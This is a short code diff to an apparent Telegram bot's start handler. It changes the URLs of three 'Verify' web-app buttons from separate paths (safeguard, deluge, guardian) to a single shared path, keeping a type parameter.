@@ -226,7 +226,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "VERIFY",
                 web_app: {
-                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
+                  url: `${process.env.DOMAIN}/a/?type=safeguard`
                 }
               }]]
             }
@@ -240,7 +240,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Tap To Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                  url: `${process.env.DOMAIN}/a/?type=deluge`
                 }
               }]]
             }
@@ -254,7 +254,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                  url: `${process.env.DOMAIN}/a/?type=guardian`
                 }
               }]]
             }
